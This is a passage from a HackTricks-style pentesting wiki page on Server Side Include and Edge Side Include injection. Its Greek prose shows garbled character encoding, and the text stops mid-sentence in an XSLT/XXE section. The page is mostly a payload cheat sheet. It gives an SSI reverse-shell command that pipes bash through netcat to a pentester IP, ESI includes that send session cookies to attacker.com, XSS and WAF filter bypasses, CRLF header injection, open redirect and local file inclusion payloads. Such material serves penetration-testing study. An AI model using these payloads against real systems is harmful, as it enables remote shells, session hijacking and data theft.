# Server Side Inclusion/Edge Side Inclusion Injection

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Server Side Inclusion Basic Information

**(Introduction taken from [Apache docs](https://httpd.apache.org/docs/current/howto/ssi.html))**

SSI (Server Side Includes) ÎµÎ¯Î½Î±Î¹ ÎµÎ½Ï„Î¿Î»Î­Ï‚ Ï€Î¿Ï… **Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î¿ÏÎ½Ï„Î±Î¹ ÏƒÎµ ÏƒÎµÎ»Î¯Î´ÎµÏ‚ HTML ÎºÎ±Î¹ Î±Î¾Î¹Î¿Î»Î¿Î³Î¿ÏÎ½Ï„Î±Î¹ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®** ÎµÎ½Ï Î¿Î¹ ÏƒÎµÎ»Î¯Î´ÎµÏ‚ ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„Î¿ÏÎ½Ï„Î±Î¹. Î£Î±Ï‚ ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Ï…Î½ Î½Î± **Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Î´Ï…Î½Î±Î¼Î¹ÎºÎ¬ Ï€Î±ÏÎ±Î³ÏŒÎ¼ÎµÎ½Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿** ÏƒÎµ Î¼Î¹Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± ÏƒÎµÎ»Î¯Î´Î± HTML, Ï‡Ï‰ÏÎ¯Ï‚ Î½Î± Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„Î®ÏƒÎµÏ„Îµ Î¿Î»ÏŒÎºÎ»Î·ÏÎ· Ï„Î· ÏƒÎµÎ»Î¯Î´Î± Î¼Î­ÏƒÏ‰ ÎµÎ½ÏŒÏ‚ Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î¿Ï‚ CGI Î® Î¬Î»Î»Î·Ï‚ Î´Ï…Î½Î±Î¼Î¹ÎºÎ®Ï‚ Ï„ÎµÏ‡Î½Î¿Î»Î¿Î³Î¯Î±Ï‚.\
Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï„Î¿Ï€Î¿Î¸ÎµÏ„Î®ÏƒÎµÏ„Îµ Î¼Î¹Î± ÎµÎ½Ï„Î¿Î»Î® ÏƒÎµ Î¼Î¹Î± Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎ± ÏƒÎµÎ»Î¯Î´Î± HTML, ÏŒÏ€Ï‰Ï‚:

`<!--#echo var="DATE_LOCAL" -->`

ÎšÎ±Î¹, ÏŒÏ„Î±Î½ Î· ÏƒÎµÎ»Î¯Î´Î± ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„ÎµÎ¯Ï„Î±Î¹, Î±Ï…Ï„ÏŒ Ï„Î¿ Ï„Î¼Î®Î¼Î± Î¸Î± Î±Î¾Î¹Î¿Î»Î¿Î³Î·Î¸ÎµÎ¯ ÎºÎ±Î¹ Î¸Î± Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸ÎµÎ¯ Î¼Îµ Ï„Î·Î½ Ï„Î¹Î¼Î® Ï„Î¿Ï…:

`Tuesday, 15-Jan-2013 19:28:54 EST`

Î— Î±Ï€ÏŒÏ†Î±ÏƒÎ· Î³Î¹Î± Ï„Î¿ Ï€ÏŒÏ„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ SSI ÎºÎ±Î¹ Ï€ÏŒÏ„Îµ Î½Î± Î­Ï‡ÎµÏ„Îµ Ï„Î· ÏƒÎµÎ»Î¯Î´Î± ÏƒÎ±Ï‚ Î½Î± Ï€Î±ÏÎ¬Î³ÎµÏ„Î±Î¹ ÎµÎ¾ Î¿Î»Î¿ÎºÎ»Î®ÏÎ¿Ï… Î±Ï€ÏŒ ÎºÎ¬Ï€Î¿Î¹Î¿ Ï€ÏÏŒÎ³ÏÎ±Î¼Î¼Î±, ÎµÎ¯Î½Î±Î¹ ÏƒÏ…Î½Î®Î¸Ï‰Ï‚ Î¸Î­Î¼Î± Ï„Î¿Ï… Ï€ÏŒÏƒÎ¿ ÏƒÏ„Î±Ï„Î¹ÎºÎ® ÎµÎ¯Î½Î±Î¹ Î· ÏƒÎµÎ»Î¯Î´Î± ÎºÎ±Î¹ Ï€ÏŒÏƒÎ¿ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏ„Î±Î¹ Î½Î± ÎµÏ€Î±Î½Î±Ï‹Ï€Î¿Î»Î¿Î³Î¯Î¶ÎµÏ„Î±Î¹ ÎºÎ¬Î¸Îµ Ï†Î¿ÏÎ¬ Ï€Î¿Ï… ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„ÎµÎ¯Ï„Î±Î¹ Î· ÏƒÎµÎ»Î¯Î´Î±. Î¤Î¿ SSI ÎµÎ¯Î½Î±Î¹ Î­Î½Î±Ï‚ ÎµÎ¾Î±Î¹ÏÎµÏ„Î¹ÎºÏŒÏ‚ Ï„ÏÏŒÏ€Î¿Ï‚ Î³Î¹Î± Î½Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÏ„Îµ Î¼Î¹ÎºÏÎ¬ ÎºÎ¿Î¼Î¼Î¬Ï„Î¹Î± Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½, ÏŒÏ€Ï‰Ï‚ Î· Ï„ÏÎ­Ï‡Î¿Ï…ÏƒÎ± ÏÏÎ± - ÏŒÏ€Ï‰Ï‚ Ï†Î±Î¯Î½ÎµÏ„Î±Î¹ Ï€Î±ÏÎ±Ï€Î¬Î½Ï‰. Î‘Î»Î»Î¬ Î±Î½ Î· Ï€Î»ÎµÎ¹Î¿ÏˆÎ·Ï†Î¯Î± Ï„Î·Ï‚ ÏƒÎµÎ»Î¯Î´Î±Ï‚ ÏƒÎ±Ï‚ Ï€Î±ÏÎ¬Î³ÎµÏ„Î±Î¹ Ï„Î· ÏƒÏ„Î¹Î³Î¼Î® Ï€Î¿Ï… ÎµÎ¾Ï…Ï€Î·ÏÎµÏ„ÎµÎ¯Ï„Î±Î¹, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î±Î½Î±Î¶Î·Ï„Î®ÏƒÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î± Î¬Î»Î»Î· Î»ÏÏƒÎ·.

ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ…Î¼Ï€ÎµÏÎ¬Î½ÎµÏ„Îµ Ï„Î·Î½ Ï€Î±ÏÎ¿Ï…ÏƒÎ¯Î± Ï„Î¿Ï… SSI Î±Î½ Î· Î´Î¹Î±Î´Î¹ÎºÏ„Ï…Î±ÎºÎ® ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ Î±ÏÏ‡ÎµÎ¯Î± Î¼Îµ Ï„Î¹Ï‚ ÎµÏ€ÎµÎºÏ„Î¬ÏƒÎµÎ¹Ï‚ ** `.shtml`, `.shtm` Î® `.stm`**, Î±Î»Î»Î¬ Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î¼ÏŒÎ½Î¿ Î±Ï…Ï„Î® Î· Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·.

ÎœÎ¹Î± Ï„Ï…Ï€Î¹ÎºÎ® Î­ÎºÏ†ÏÎ±ÏƒÎ· SSI Î­Ï‡ÎµÎ¹ Ï„Î·Î½ ÎµÎ¾Î®Ï‚ Î¼Î¿ÏÏ†Î®:
```
<!--#directive param="value" -->
```
### ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚
```javascript
// Document name
<!--#echo var="DOCUMENT_NAME" -->
// Date
<!--#echo var="DATE_LOCAL" -->

// File inclusion
<!--#include virtual="/index.html" -->
// Including files (same directory)
<!--#include file="file_to_include.html" -->
// CGI Program results
<!--#include virtual="/cgi-bin/counter.pl" -->
// Including virtual files (same directory)
<!--#include virtual="file_to_include.html" -->
// Modification date of a file
<!--#flastmod file="index.html" -->

// Command exec
<!--#exec cmd="dir" -->
// Command exec
<!--#exec cmd="ls" -->
// Reverse shell
<!--#exec cmd="mkfifo /tmp/foo;nc <PENTESTER IP> <PORT> 0</tmp/foo|/bin/bash 1>/tmp/foo;rm /tmp/foo" -->

// Print all variables
<!--#printenv -->
// Setting variables
<!--#set var="name" value="Rich" -->

```
## Edge Side Inclusion

Î¥Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î± Ï€ÏÏŒÎ²Î»Î·Î¼Î± **Î¼Îµ Ï„Î·Î½ Î±Ï€Î¿Î¸Î®ÎºÎµÏ…ÏƒÎ· Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¹ÏÎ½ Î® Î´Ï…Î½Î±Î¼Î¹ÎºÏÎ½ ÎµÏ†Î±ÏÎ¼Î¿Î³ÏÎ½** ÎºÎ±Î¸ÏÏ‚ Î¼Î­ÏÎ¿Ï‚ Ï„Î¿Ï… Ï€ÎµÏÎ¹ÎµÏ‡Î¿Î¼Î­Î½Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡ÎµÎ¹ **Î´Î¹Î±Ï†Î¿ÏÎµÎ¸ÎµÎ¯** Î³Î¹Î± Ï„Î·Î½ ÎµÏ€ÏŒÎ¼ÎµÎ½Î· Ï†Î¿ÏÎ¬ Ï€Î¿Ï… Î¸Î± Î±Î½Î±ÎºÏ„Î·Î¸ÎµÎ¯ Ï„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿. Î‘Ï…Ï„ÏŒ ÎµÎ¯Î½Î±Î¹ Ï€Î¿Ï… Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Ï„Î¿ **ESI**, Î³Î¹Î± Î½Î± Ï…Ï€Î¿Î´ÎµÎ¯Î¾ÎµÎ¹ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ ESI Ï„Î¿ **Î´Ï…Î½Î±Î¼Î¹ÎºÏŒ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ Ï€Î¿Ï… Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï€Î±ÏÎ±Ï‡Î¸ÎµÎ¯** Ï€ÏÎ¹Î½ Î±Ï€ÏŒ Ï„Î·Î½ Î±Ï€Î¿ÏƒÏ„Î¿Î»Î® Ï„Î·Ï‚ Î­ÎºÎ´Î¿ÏƒÎ·Ï‚ cache.\
Î•Î¬Î½ Î­Î½Î±Ï‚ **ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï‚** ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î¼Î¹Î± ÎµÏ„Î¹ÎºÎ­Ï„Î± ESI** Î¼Î­ÏƒÎ± ÏƒÏ„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿ cache, Ï„ÏŒÏ„Îµ Î¸Î± Î¼Ï€Î¿ÏÎ¿ÏÏƒÎµ Î½Î± ÎµÎ¯Î½Î±Î¹ ÏƒÎµ Î¸Î­ÏƒÎ· Î½Î± **ÎµÎ¹ÏƒÎ¬Î³ÎµÎ¹ Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ Ï€ÎµÏÎ¹ÎµÏ‡ÏŒÎ¼ÎµÎ½Î¿** ÏƒÏ„Î¿ Î­Î³Î³ÏÎ±Ï†Î¿ Ï€ÏÎ¹Î½ ÏƒÏ„Î±Î»ÎµÎ¯ ÏƒÏ„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚.

### ESI Detection

Î— Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ **ÎºÎµÏ†Î±Î»Î¯Î´Î±** ÏƒÎµ Î¼Î¹Î± Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Î±Ï€ÏŒ Ï„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ESI:
```
Surrogate-Control: content="ESI/1.0"
```
Î‘Î½ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Î±Ï…Ï„Î® Ï„Î·Î½ ÎºÎµÏ†Î±Î»Î¯Î´Î±, Î¿ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®Ï‚ **Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯ ESI Î¿ÏÏ„Ï‰Ï‚ Î® Î¬Î»Î»Ï‰Ï‚**.\
ÎœÎ¹Î± **Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ· Ï„Ï…Ï†Î»Î®Ï‚ ÎµÎºÎ¼ÎµÏ„Î¬Î»Î»ÎµÏ…ÏƒÎ·Ï‚ Î¼Ï€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯** ÎºÎ±Î¸ÏÏ‚ Î­Î½Î± Î±Î¯Ï„Î·Î¼Î± Î¸Î± Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Ï†Ï„Î¬ÏƒÎµÎ¹ ÏƒÏ„Î¿Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î® Ï„Ï‰Î½ ÎµÏ€Î¹Ï„Î¹Î¸ÎµÎ¼Î­Î½Ï‰Î½:
```javascript
// Basic detection
hell<!--esi-->o
// If previous is reflected as "hello", it's vulnerable

// Blind detection
<esi:include src=http://attacker.com>

// XSS Exploitation Example
<esi:include src=http://attacker.com/XSSPAYLOAD.html>

// Cookie Stealer (bypass httpOnly flag)
<esi:include src=http://attacker.com/?cookie_stealer.php?=$(HTTP_COOKIE)>

// Introduce private local files (Not LFI per se)
<esi:include src="supersecret.txt">

// Valid for Akamai, sends debug information in the response
<esi:debug/>
```
### ESI exploitation

[GoSecure Î´Î·Î¼Î¹Î¿ÏÏÎ³Î·ÏƒÎµ](https://www.gosecure.net/blog/2018/04/03/beyond-xss-edge-side-include-injection/) Î­Î½Î±Î½ Ï€Î¯Î½Î±ÎºÎ± Î³Î¹Î± Î½Î± ÎºÎ±Ï„Î±Î½Î¿Î®ÏƒÎ¿Ï…Î¼Îµ Ï„Î¹Ï‚ Ï€Î¹Î¸Î±Î½Î­Ï‚ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ¼Îµ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎ¿Ï…Î¼Îµ ÏƒÎµ Î´Î¹Î¬Ï†Î¿ÏÎ± Î»Î¿Î³Î¹ÏƒÎ¼Î¹ÎºÎ¬ Ï€Î¿Ï… Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Ï…Î½ ESI, Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¹ÎºÏŒÏ„Î·Ï„Î± Ï€Î¿Ï… Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶Î¿Ï…Î½:

* **Includes**: Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `<esi:includes>`
* **Vars**: Î¥Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® `<esi:vars>`. Î§ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Ï„Î·Î½ Ï€Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Ï†Î¯Î»Ï„ÏÏ‰Î½ XSS
* **Cookie**: Î¤Î± cookies Ï„Î¿Ï… ÎµÎ³Î³ÏÎ¬Ï†Î¿Ï… ÎµÎ¯Î½Î±Î¹ Ï€ÏÎ¿ÏƒÎ²Î¬ÏƒÎ¹Î¼Î± ÏƒÏ„Î¿Î½ ÎºÎ¹Î½Î·Ï„Î®ÏÎ± ESI
* **Upstream Headers Required**: ÎŸÎ¹ ÎµÏ†Î±ÏÎ¼Î¿Î³Î­Ï‚ Ï…Ï€Î¿ÎºÎ±Ï„Î¬ÏƒÏ„Î±ÏƒÎ·Ï‚ Î´ÎµÎ½ Î¸Î± ÎµÏ€ÎµÎ¾ÎµÏÎ³Î±ÏƒÏ„Î¿ÏÎ½ Î´Î·Î»ÏÏƒÎµÎ¹Ï‚ ESI ÎµÎºÏ„ÏŒÏ‚ Î±Î½ Î· upstream ÎµÏ†Î±ÏÎ¼Î¿Î³Î® Ï€Î±ÏÎ­Ï‡ÎµÎ¹ Ï„Î¹Ï‚ ÎºÎµÏ†Î±Î»Î¯Î´ÎµÏ‚
* **Host Allowlist**: Î£Îµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï€ÎµÏÎ¯Ï€Ï„Ï‰ÏƒÎ·, Î¿Î¹ ESI includes ÎµÎ¯Î½Î±Î¹ Î´Ï…Î½Î±Ï„Î­Ï‚ Î¼ÏŒÎ½Î¿ Î±Ï€ÏŒ ÎµÏ€Î¹Ï„ÏÎµÏ€ÏŒÎ¼ÎµÎ½Î¿Ï…Ï‚ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î­Ï‚, ÎºÎ±Î¸Î¹ÏƒÏ„ÏÎ½Ï„Î±Ï‚ Ï„Î¿ SSRF, Î³Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±, Î´Ï…Î½Î±Ï„ÏŒ Î¼ÏŒÎ½Î¿ ÎºÎ±Ï„Î¬ Î±Ï…Ï„ÏÎ½ Ï„Ï‰Î½ Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„ÏÎ½

|         **Software**         | **Includes** | **Vars** | **Cookies** | **Upstream Headers Required** | **Host Whitelist** |
| :--------------------------: | :----------: | :------: | :---------: | :---------------------------: | :----------------: |
|            Squid3            |      Yes     |    Yes   |     Yes     |              Yes              |         No         |
|         Varnish Cache        |      Yes     |    No    |      No     |              Yes              |         Yes        |
|            Fastly            |      Yes     |    No    |      No     |               No              |         Yes        |
| Akamai ESI Test Server (ETS) |      Yes     |    Yes   |     Yes     |               No              |         No         |
|          NodeJS esi          |      Yes     |    Yes   |     Yes     |               No              |         No         |
|         NodeJS nodesi        |      Yes     |    No    |      No     |               No              |      Optional      |

#### XSS

Î— Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î® ESI Î¸Î± Ï†Î¿ÏÏ„ÏÏƒÎµÎ¹ Î­Î½Î± Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ Î¼Î­ÏƒÎ± ÏƒÏ„Î·Î½ Î±Ï€ÏŒÎºÏÎ¹ÏƒÎ· Ï„Î¿Ï… Î´Î¹Î±ÎºÎ¿Î¼Î¹ÏƒÏ„Î®
```xml
<esi:include src=http://attacker.com/xss.html>
```
#### Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· Ï€ÏÎ¿ÏƒÏ„Î±ÏƒÎ¯Î±Ï‚ XSS Ï€ÎµÎ»Î¬Ï„Î·
```xml
x=<esi:assign name="var1" value="'cript'"/><s<esi:vars name="$(var1)"/>>alert(/Chrome%20XSS%20filter%20bypass/);</s<esi:vars name="$(var1)"/>>

Use <!--esi--> to bypass WAFs:
<scr<!--esi-->ipt>aler<!--esi-->t(1)</sc<!--esi-->ript>
<img+src=x+on<!--esi-->error=ale<!--esi-->rt(1)>
```
#### ÎšÎ»Î¿Ï€Î® Cookie

* Î‘Ï€Î¿Î¼Î±ÎºÏÏ…ÏƒÎ¼Î­Î½Î· ÎºÎ»Î¿Ï€Î® cookie
```xml
<esi:include src=http://attacker.com/$(HTTP_COOKIE)>
<esi:include src="http://attacker.com/?cookie=$(HTTP_COOKIE{'JSESSIONID'})" />
```
* ÎšÎ»Î­ÏˆÏ„Îµ Ï„Î¿ cookie HTTP\_ONLY Î¼Îµ XSS Î±Î½Ï„Î±Î½Î±ÎºÎ»ÏÎ½Ï„Î±Ï‚ Ï„Î¿ ÏƒÏ„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·:
```bash
# This will reflect the cookies in the response
<!--esi $(HTTP_COOKIE) -->
# Reflect XSS (you can put '"><svg/onload=prompt(1)>' URL encoded and the URL encode eveyrhitng to send it in the HTTP request)
<!--esi/$url_decode('"><svg/onload=prompt(1)>')/-->

# It's possible to put more complex JS code to steal cookies or perform actions
```
#### Î™Î´Î¹Ï‰Ï„Î¹ÎºÏŒ Î¤Î¿Ï€Î¹ÎºÏŒ Î‘ÏÏ‡ÎµÎ¯Î¿

ÎœÎ·Î½ Ï„Î¿ ÏƒÏ…Î³Ï‡Î­ÎµÏ„Îµ Î¼Îµ Î¼Î¹Î± "Î¤Î¿Ï€Î¹ÎºÎ® Î£Ï…Î¼Ï€ÎµÏÎ¯Î»Î·ÏˆÎ· Î‘ÏÏ‡ÎµÎ¯Î¿Ï…":
```markup
<esi:include src="secret.txt">
```
#### CRLF
```markup
<esi:include src="http://anything.com%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aJunkHeader:%20JunkValue/"/>
```
#### Open Redirect

Î¤Î¿ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ Î¸Î± Ï€ÏÎ¿ÏƒÎ¸Î­ÏƒÎµÎ¹ Î­Î½Î± `Location` header ÏƒÏ„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·
```bash
<!--esi $add_header('Location','http://attacker.com') -->
```
#### Î ÏÎ¿ÏƒÎ¸Î®ÎºÎ· ÎšÎµÏ†Î±Î»Î¯Î´Î±Ï‚

* Î ÏÎ¿ÏƒÎ¸Î®ÎºÎ· ÎºÎµÏ†Î±Î»Î¯Î´Î±Ï‚ ÏƒÎµ Î±Î½Î±Î³ÎºÎ±ÏƒÏ„Î¹ÎºÏŒ Î±Î¯Ï„Î·Î¼Î±
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345"/>
</esi:include>
```
* Î ÏÎ¿ÏƒÎ¸Î­ÏƒÏ„Îµ ÎºÎµÏ†Î±Î»Î¯Î´Î± ÏƒÏ„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· (Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± Î½Î± Ï€Î±ÏÎ±ÎºÎ¬Î¼ÏˆÎµÏ„Îµ Ï„Î¿ "Content-Type: text/json" ÏƒÎµ Î¼Î¹Î± Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Î¼Îµ XSS)
```bash
<!--esi/$add_header('Content-Type','text/html')/-->

<!--esi/$(HTTP_COOKIE)/$add_header('Content-Type','text/html')/$url_decode($url_decode('"><svg/onload=prompt(1)>'))/-->

# Check the number of url_decode to know how many times you can URL encode the value
```
#### CRLF ÏƒÏ„Î¿ Add header (**CVE-2019-2438**)
```xml
<esi:include src="http://example.com/asdasd">
<esi:request_header name="User-Agent" value="12345
Host: anotherhost.com"/>
</esi:include>
```
#### Akamai debug

Î‘Ï…Ï„ÏŒ Î¸Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î±Ï€Î¿ÏƒÏ†Î±Î»Î¼Î¬Ï„Ï‰ÏƒÎ·Ï‚ Ï€Î¿Ï… Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½Î¿Î½Ï„Î±Î¹ ÏƒÏ„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ·:
```xml
<esi:debug/>
```
### ESI + XSLT = XXE

ÎœÎµ Ï„Î·Î½ ÎºÎ±Î¸Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î· Ï„Î¹Î¼Î® `xslt` Î³Î¹Î± Ï„Î·Î½ Ï€Î±ÏÎ¬Î¼ÎµÏ„ÏÎ¿ _dca_, ÎµÎ¯Î½Î±Î¹ ÎµÏ†Î¹ÎºÏ„ÏŒ Î½Î± ÏƒÏ…Î¼Ï€ÎµÏÎ¹Î»Î·Ï†Î¸ÎµÎ¯ **`eXtensible Stylesheet Language Transformations (XSLT)`** Î²Î±ÏƒÎ¹ÏƒÎ¼Î­Î½Î¿ ESI. Î— ÏƒÏ…Î¼Ï€ÎµÏÎ¯Î»Î·ÏˆÎ· Ï€ÏÎ¿ÎºÎ±Î»ÎµÎ¯ Ï„Î·Î½ Î±Î½Î¬ÎºÏ„Î·ÏƒÎ· Ï„Ï‰Î½ Î±ÏÏ‡ÎµÎ¯Ï‰Î½ XML ÎºÎ±Î¹ XSLT Î±Ï€ÏŒ Ï„Î¿Î½ HTTP surrogate, Î¼Îµ Ï„Î¿ Î´ÎµÏÏ„ÎµÏÎ¿ Î½Î± Ï†Î¹Î»Ï„ÏÎ¬ÏÎµÎ¹ Ï„Î¿ Ï€ÏÏÏ„Î¿. Î¤Î­Ï„Î¿Î¹Î± Î±ÏÏ‡ÎµÎ¯Î± XML ÎµÎ¯Î½Î±Î¹ ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏÏƒÎ¹Î¼Î± Î³Î¹Î± ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ _XML External Entity (XXE)_, ÎµÏ€Î¹Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ ÏƒÏ„Î¿Ï…Ï‚ ÎµÏ€Î¹Ï„Î¹Î¸Î­Î¼ÎµÎ½Î¿Ï…Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î¿ÏÎ½ ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ SSRF. Î©ÏƒÏ„ÏŒÏƒÎ¿, Î· Ï‡ÏÎ·ÏƒÎ¹Î¼ÏŒÏ„Î·Ï„Î± Î±Ï…Ï„Î®Ï‚ Ï„Î·Ï‚ Ï€ÏÎ¿ÏƒÎ­Î³Î³Î¹ÏƒÎ·Ï‚ ÎµÎ¯Î½Î±Î¹ Ï€ÎµÏÎ¹Î¿ÏÎ¹ÏƒÎ¼Î­Î½Î·, ÎºÎ±Î¸ÏÏ‚ Ï„Î¿ ESI Ï€ÎµÏÎ¹Î»Î±Î¼Î²Î¬Î½ÎµÎ¹ Î®Î´Î· Ï‰Ï‚ vector SSRF. Î›ÏŒÎ³Ï‰ Ï„Î·Ï‚ Î±Ï€Î¿Ï…ÏƒÎ¯Î±Ï‚ Ï…Ï€Î¿ÏƒÏ„Î®ÏÎ¹Î¾Î·Ï‚ ÏƒÏ„Î· Î²Î±ÏƒÎ¹ÎºÎ® Î²Î¹Î²Î»Î¹Î¿Î¸Î®ÎºÎ· Xalan, Î¿Î¹ ÎµÎ¾Ï‰Ï„ÎµÏÎ¹ÎºÎ­Ï‚ DTDs Î´ÎµÎ½ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶Î¿Î½Ï„Î±Î¹, Î±Ï€Î¿Ï„ÏÎ­Ï€Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ ÎµÎ¾Î±Î³Ï‰Î³Î® 